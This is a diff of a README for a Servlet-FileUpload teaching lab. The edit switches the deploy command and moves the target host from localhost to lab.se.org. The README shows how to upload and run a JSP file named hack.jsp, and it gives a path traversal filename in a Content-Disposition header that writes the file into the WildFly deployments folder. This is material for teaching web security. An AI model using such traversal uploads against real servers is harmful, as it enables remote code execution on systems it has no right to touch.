@@ -1,26 +1,21 @@
 Example: Servlet-FileUpload
 -------------------------------------------------------------------------------
+You can access the Web application from your browser:
+
+URL: http://lab.se.org:8080/Servlet-FileUpload
 
 
 How to run the example?
 -------------------------------------------------------------------------------
 
-$ mvn wildfly:run
+$ mvn wildfly:deploy
 
-This maven command line builds the WAR file, starts the Wildfly AS, and deploys
-the Web application.
-
-You can access the Web application from your browser:
-
-URL: http://localhost:8080/Servlet-FileUpload
-	
 Make sure that you have a /home/student/tmp folder!!!
 $ pwd
 /home/student
 $ mkdir tmp
 
- 	
-	
+
 Demo: Upload a file
 -------------------------------------------------------------------------------
 Select a file and upload this file into this Web application.
@@ -184,14 +179,14 @@ In the browser we can upload a JSP like this hack.jsp file:
 	</html>
 
 So, we can a execute the JSP be browsing to: 
-	http://localhost:8080/Servlet-FileUpload/hack.jsp	
+	http://lab.se.org:8080/Servlet-FileUpload/hack.jsp
 
 Using a path traversal attack
 o) Change request parameter to:
 	Content-Disposition: form-data; name="file"; filename="../install/wildfly-8.2.0.Final/standalone/deployments/Servlet-FileUpload.war/hack.jsp"
 	Content-Type: application/octet-stream
 	
-o) Browse to: http://localhost:8080/Servlet-FileUpload/hack.jsp	
+o) Browse to: http://lab.se.org:8080/Servlet-FileUpload/hack.jsp
 				
 
 
